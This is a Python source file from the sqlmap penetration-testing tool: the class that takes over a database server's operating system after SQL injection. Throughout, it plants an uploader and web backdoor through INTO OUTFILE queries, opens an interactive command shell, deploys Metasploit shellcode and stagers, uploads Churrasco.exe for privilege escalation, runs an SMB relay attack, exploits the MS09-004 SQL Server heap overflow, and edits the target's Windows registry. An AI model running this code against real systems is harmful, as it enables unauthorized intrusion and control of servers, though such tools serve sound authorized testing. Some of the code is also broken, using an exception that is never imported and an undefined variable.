#!/usr/bin/env python

"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2007-2009 Bernardo Damele A. G. <bernardo.damele@gmail.com>
Copyright (c) 2006 Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""



import os
import re

from lib.core.agent import agent
from lib.core.common import fileToStr
from lib.core.common import getDirs
from lib.core.common import getDocRoot
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.convert import hexencode
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import paths
from lib.core.exception import sqlmapUnsupportedDBMSException
from lib.core.shell import autoCompletion
from lib.request.connect import Connect as Request
from lib.takeover.abstraction import Abstraction
from lib.takeover.metasploit import Metasploit
from lib.takeover.registry import Registry
from lib.techniques.outband.stacked import stackedTest


class Takeover(Abstraction, Metasploit, Registry):
    """
    This class defines generic OS takeover functionalities for plugins.
    """

    def __init__(self):
        self.cmdTblName       = "sqlmapoutput"
        self.tblField         = "data"
        self.cmdFromChurrasco = False

        Abstraction.__init__(self)


    def __webBackdoorRunCmd(self, backdoorUrl, cmd):
        output = None

        if not cmd:
            cmd = conf.osCmd

        cmdUrl  = "%s?cmd=%s" % (backdoorUrl, cmd)
        page, _ = Request.getPage(url=cmdUrl, direct=True)
        output  = re.search("<pre>(.+?)</pre>", page, re.I | re.S)

        if output:
            print output.group(1)
        else:
            print "No output"

        return output


    def __webBackdoorShell(self, backdoorUrl):
        infoMsg  = "calling OS shell. To quit type "
        infoMsg += "'x' or 'q' and press ENTER"
        logger.info(infoMsg)

        autoCompletion(osShell=True)

        while True:
            command = None

            try:
                command = raw_input("os-shell> ")
            except KeyboardInterrupt:
                print
                errMsg = "user aborted"
                logger.error(errMsg)
            except EOFError:
                print
                errMsg = "exit"
                logger.error(errMsg)
                break

            if not command:
                continue

            if command.lower() in ( "x", "q", "exit", "quit" ):
                break

            self.__webBackdoorRunCmd(backdoorUrl, command)


    def __webBackdoorInit(self):
        """
        This method is used to write a web backdoor (agent) on a writable
        remote directory within the web server document root.
        """

        self.checkDbmsOs()

        backdoorUrl = None
        language    = None
        kb.docRoot  = getDocRoot()
        directories = getDirs()
        directories = list(directories)
        directories.sort()

        infoMsg = "trying to upload the uploader agent"
        logger.info(infoMsg)

        message  = "which web application language does the web server "
        message += "support?\n"
        message += "[1] ASP\n"
        message += "[2] PHP (default)\n"
        message += "[3] JSP"

        while True:
            choice = readInput(message, default="2")

            if not choice or choice == "2":
                language = "php"

                break

            elif choice == "1":
                language = "asp"

                break

            elif choice == "3":
                # TODO: add also JSP backdoor/uploader support
                errMsg  = "JSP web backdoor functionality is not yet "
                errMsg += "implemented"
                raise sqlmapUnsupportedDBMSException, errMsg

                #language = "jsp"

                #break

            elif not choice.isdigit():
                logger.warn("invalid value, only digits are allowed")

            elif int(choice) < 1 or int(choice) > 3:
                logger.warn("invalid value, it must be 1 or 3")

        backdoorName = "backdoor.%s" % language
        backdoorPath = os.path.join(paths.SQLMAP_SHELL_PATH, backdoorName)
        uploaderName = "uploader.%s" % language
        uploaderStr  = fileToStr(os.path.join(paths.SQLMAP_SHELL_PATH, uploaderName))

        for directory in directories:
            # Upload the uploader agent
            outFile     = os.path.normpath("%s/%s" % (directory, uploaderName))
            uplQuery    = uploaderStr.replace("WRITABLE_DIR", directory)
            query       = " LIMIT 1 INTO OUTFILE '%s' " % outFile
            query      += "LINES TERMINATED BY 0x%s --" % hexencode(uplQuery)
            query       = agent.prefixQuery(" %s" % query)
            query       = agent.postfixQuery(query)
            payload     = agent.payload(newValue=query)
            page        = Request.queryPage(payload)

            requestDir  = os.path.normpath(directory.replace(kb.docRoot, "/").replace("\\", "/"))
            baseUrl     = "%s://%s:%d%s" % (conf.scheme, conf.hostname, conf.port, requestDir)
            uploaderUrl = "%s/%s" % (baseUrl, uploaderName)
            uploaderUrl = uploaderUrl.replace("./", "/").replace("\\", "/").replace("//", "/")
            uplPage, _  = Request.getPage(url=uploaderUrl, direct=True)

            if "sqlmap backdoor uploader" not in uplPage:
                warnMsg  = "unable to upload the uploader "
                warnMsg += "agent on '%s'" % directory
                logger.warn(warnMsg)

                continue

            infoMsg  = "the uploader agent has been successfully uploaded "
            infoMsg += "on '%s'" % directory
            logger.info(infoMsg)

            # Upload the backdoor through the uploader agent
            if language == "php":
                multipartParams = {
                                    "upload":    "1",
                                    "file":      open(backdoorPath, "r"),
                                    "uploadDir": directory,
                                  }
                page = Request.getPage(url=uploaderUrl, multipart=multipartParams)

                if "Backdoor uploaded" not in page:
                    warnMsg  = "unable to upload the backdoor through "
                    warnMsg += "the uploader agent on '%s'" % directory
                    logger.warn(warnMsg)

                    continue

            elif language == "asp":
                backdoorRemotePath = "%s/%s" % (directory, backdoorName)
                backdoorRemotePath = os.path.normpath(backdoorRemotePath)
                backdoorContent = open(backdoorPath, "r").read()
                postStr = "f=%s&d=%s" % (backdoorRemotePath, backdoorContent)
                page, _ = Request.getPage(url=uploaderUrl, direct=True, post=postStr)

                if "permission denied" in page.lower():
                    warnMsg  = "unable to upload the backdoor through "
                    warnMsg += "the uploader agent on '%s'" % directory
                    logger.warn(warnMsg)

                    continue

            elif language == "jsp":
                # TODO: add also JSP backdoor/uploader support
                pass

            backdoorUrl = "%s/%s" % (baseUrl, backdoorName)

            infoMsg  = "the backdoor has probably been successfully "
            infoMsg += "uploaded on '%s', go with your browser " % directory
            infoMsg += "to '%s' and enjoy it!" % backdoorUrl
            logger.info(infoMsg)

            break

        return backdoorUrl


    def uploadChurrasco(self):
        msg  = "do you want sqlmap to upload Churrasco and call the "
        msg += "Metasploit payload stager as its argument so that it "
        msg += "will be started as SYSTEM? [Y/n] "

        output = readInput(msg, default="Y")

        if not output or output[0] in ( "y", "Y" ):
            # TODO: add also compiled/packed Churrasco for Windows 2008
            wFile = os.path.join(paths.SQLMAP_CONTRIB_PATH, "tokenkidnapping", "Churrasco.exe")

            self.churrascoPath    = "%s/sqlmapchur%s.exe" % (conf.tmpPath, randomStr(lowercase=True))
            self.cmdFromChurrasco = True

            self.writeFile(wFile, self.churrascoPath, "binary", confirm=False)

            return True
        else:
            return False


    def osCmd(self):
        stackedTest()

        if kb.stackedTest == False:
            infoMsg  = "going to upload a web page backdoor for command "
            infoMsg += "execution"
            logger.info(infoMsg)

            backdoorUrl = self.__webBackdoorInit()

            if backdoorUrl:
                self.__webBackdoorRunCmd(backdoorUrl, conf.osCmd)
        else:
            self.initEnv()
            self.runCmd(conf.osCmd)


    def osShell(self):
        stackedTest()

        if kb.stackedTest == False:
            infoMsg  = "going to upload a web page backdoor for command "
            infoMsg += "execution"
            logger.info(infoMsg)

            backdoorUrl = self.__webBackdoorInit()

            if backdoorUrl:
                self.__webBackdoorShell(backdoorUrl)
        else:
            self.initEnv()
            self.absOsShell()


    def osPwn(self):
        stackedTest()

        if kb.stackedTest == False:
            return

        self.initEnv()
        self.getRemoteTempPath()

        goUdf = False

        if kb.dbms in ( "MySQL", "PostgreSQL" ):
            msg  = "how do you want to execute the Metasploit shellcode "
            msg += "on the back-end database underlying operating system?"
            msg += "\n[1] Via UDF 'sys_bineval' (in-memory way, anti-forensics, default)"
            msg += "\n[2] Stand-alone payload stager (file system way)"

            while True:
                choice = readInput(msg, default=1)

                if isinstance(choice, str) and choice.isdigit() and int(choice) in ( 1, 2 ):
                    choice = int(choice)
                    break

                elif isinstance(choice, int) and choice in ( 1, 2 ):
                    break

                else:
                    warnMsg = "invalid value, valid values are 1 and 2"
                    logger.warn(warnMsg)

            if choice == 1:
                goUdf = True

        if goUdf is True:
            self.createMsfShellcode(exitfunc="thread", format="raw", extra="BufferRegister=EAX", encode="x86/alpha_mixed")
        else:
            self.createMsfPayloadStager()
            self.uploadMsfPayloadStager()

        if kb.os == "Windows" and conf.privEsc:
            if kb.dbms == "MySQL":
                debugMsg  = "by default MySQL on Windows runs as SYSTEM "
                debugMsg += "user, no need to privilege escalate"
                logger.debug(debugMsg)

            elif kb.dbms == "PostgreSQL":
                warnMsg  = "by default PostgreSQL on Windows runs as postgres "
                warnMsg += "user which has no Windows Impersonation "
                warnMsg += "Tokens: it is unlikely that the privilege "
                warnMsg += "escalation will be successful"
                logger.warn(warnMsg)

            elif kb.dbms == "Microsoft SQL Server" and kb.dbmsVersion[0] in ( "2005", "2008" ):
                warnMsg  = "often Microsoft SQL Server %s " % kb.dbmsVersion[0]
                warnMsg += "runs as Network Service which has no Windows "
                warnMsg += "Impersonation Tokens within all threads, this "
                warnMsg += "makes Meterpreter's incognito extension to "
                warnMsg += "fail to list tokens"
                logger.warn(warnMsg)

                uploaded = self.uploadChurrasco()

                if uploaded == False:
                    warnMsg  = "beware that the privilege escalation "
                    warnMsg += "might not work"
                    logger.warn(warnMsg)

        else:
            # Unset --priv-esc if the back-end DBMS underlying operating
            # system is not Windows
            conf.privEsc = False

        self.pwn(goUdf)


    def osSmb(self):
        stackedTest()

        self.checkDbmsOs()

        if kb.os != "Windows":
            errMsg  = "the back-end DBMS underlying operating system is "
            errMsg += "not Windows: it is not possible to perform the SMB "
            errMsg += "relay attack"
            raise sqlmapUnsupportedDBMSException, errMsg

        if kb.stackedTest == False:
            if kb.dbms in ( "PostgreSQL", "Microsoft SQL Server" ):
                errMsg  = "on this back-end DBMS it is only possible to "
                errMsg += "perform the SMB relay attack if stacked "
                errMsg += "queries are supported"
                raise sqlmapUnsupportedDBMSException, errMsg

            elif kb.dbms == "MySQL":
                debugMsg  = "since stacked queries are not supported, "
                debugMsg += "sqlmap is going to perform the SMB relay "
                debugMsg += "attack via inference blind SQL injection"
                logger.debug(debugMsg)

        printWarn = True
        warnMsg   = "it is unlikely that this attack will be successful "

        if kb.dbms == "MySQL":
            warnMsg += "because by default MySQL on Windows runs as "
            warnMsg += "Local System which is not a real user, it does "
            warnMsg += "not send the NTLM session hash when connecting to "
            warnMsg += "a SMB service"

        elif kb.dbms == "PostgreSQL":
            warnMsg += "because by default PostgreSQL on Windows runs "
            warnMsg += "as postgres user which is a real user of the "
            warnMsg += "system, but not within the Administrators group"

        elif kb.dbms == "Microsoft SQL Server" and kb.dbmsVersion[0] in ( "2005", "2008" ):
            warnMsg += "because often Microsoft SQL Server %s " % kb.dbmsVersion[0]
            warnMsg += "runs as Network Service which is not a real user, "
            warnMsg += "it does not send the NTLM session hash when "
            warnMsg += "connecting to a SMB service"

        else:
            printWarn = False

        if printWarn == True:
            logger.warn(warnMsg)

        self.smb()


    def osBof(self):
        stackedTest()

        if kb.stackedTest == False:
            return

        if not kb.dbms == "Microsoft SQL Server" or kb.dbmsVersion[0] not in ( "2000", "2005" ):
            errMsg  = "the back-end DBMS must be Microsoft SQL Server "
            errMsg += "2000 or 2005 to be able to exploit the heap-based "
            errMsg += "buffer overflow in the 'sp_replwritetovarbin' "
            errMsg += "stored procedure (MS09-004)"
            raise sqlmapUnsupportedDBMSException, errMsg

        infoMsg  = "going to exploit the Microsoft SQL Server %s " % kb.dbmsVersion[0]
        infoMsg += "'sp_replwritetovarbin' stored procedure heap-based "
        infoMsg += "buffer overflow (MS09-004)"
        logger.info(infoMsg)

        self.initEnv(mandatory=False, detailed=True)
        self.getRemoteTempPath()
        self.createMsfShellcode(exitfunc="seh", format="raw", extra="-b 27", encode=True)
        self.bof()


    def __regInit(self):
        stackedTest()

        if kb.stackedTest == False:
            return

        self.checkDbmsOs()

        if kb.os != "Windows":
            errMsg  = "the back-end DBMS underlying operating system is "
            errMsg += "not Windows"
            raise sqlmapUnsupportedDBMSException, errMsg

        self.initEnv()
        self.getRemoteTempPath()


    def regRead(self):
        self.__regInit()

        if not conf.regKey:
            default = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
            msg     = "which registry key do you want to read? [%s] " % default
            regKey  = readInput(msg, default=default)
        else:
            regKey = conf.regKey

        if not conf.regVal:
            default = "ProductName"
            msg     = "which registry key value do you want to read? [%s] " % default
            regVal  = readInput(msg, default=default)
        else:
            regVal = conf.regVal

        infoMsg = "reading Windows registry path '%s\%s' " % (regKey, regVal)
        logger.info(infoMsg)

        return self.readRegKey(regKey, regVal, False)


    def regAdd(self):
        self.__regInit()

        errMsg = "missing mandatory option"

        if not conf.regKey:
            msg    = "which registry key do you want to write? "
            regKey = readInput(msg)

            if not regKey:
                raise sqlmapMissingMandatoryOptionException, errMsg
        else:
            regKey = conf.regKey

        if not conf.regVal:
            msg    = "which registry key value do you want to write? "
            regVal = readInput(msg)

            if not regVal:
                raise sqlmapMissingMandatoryOptionException, errMsg
        else:
            regVal = conf.regVal

        if not conf.regData:
            msg     = "which registry key value data do you want to write? "
            regData = readInput(msg)

            if not regData:
                raise sqlmapMissingMandatoryOptionException, errMsg
        else:
            regData = conf.regData

        if not conf.regType:
            default = "REG_SZ"
            msg     = "which registry key value data-type is it? "
            msg    += "[%s] " % default
            regType = readInput(msg, default=default)
        else:
            regType = conf.regType

        infoMsg  = "adding Windows registry path '%s\%s' " % (regKey, regVal)
        infoMsg += "with data '%s'. " % regData
        infoMsg += "This will work only if the user running the database "
        infoMsg += "process has privileges to modify the Windows registry."
        logger.info(infoMsg)

        self.addRegKey(regKey, regVal, regType, regData)


    def regDel(self):
        self.__regInit()

        errMsg = "missing mandatory option"

        if not conf.regKey:
            msg    = "which registry key do you want to delete? "
            regKey = readInput(msg)

            if not regKey:
                raise sqlmapMissingMandatoryOptionException, errMsg
        else:
            regKey = conf.regKey

        if not conf.regVal:
            msg    = "which registry key value do you want to delete? "
            regVal = readInput(msg, default=default)

            if not regVal:
                raise sqlmapMissingMandatoryOptionException, errMsg
        else:
            regVal = conf.regVal

        message  = "are you sure that you want to delete the Windows "
        message += "registry path '%s\%s? [y/N] " % (regKey, regVal)
        output   = readInput(message, default="N")

        if output and output[0] not in ( "Y", "y" ):
            return

        infoMsg  = "deleting Windows registry path '%s\%s'" % (regKey, regVal)
        infoMsg += "This will work only if the user running the database "
        infoMsg += "process has privileges to modify the Windows registry."
        logger.info(infoMsg)

        self.delRegKey(regKey, regVal)
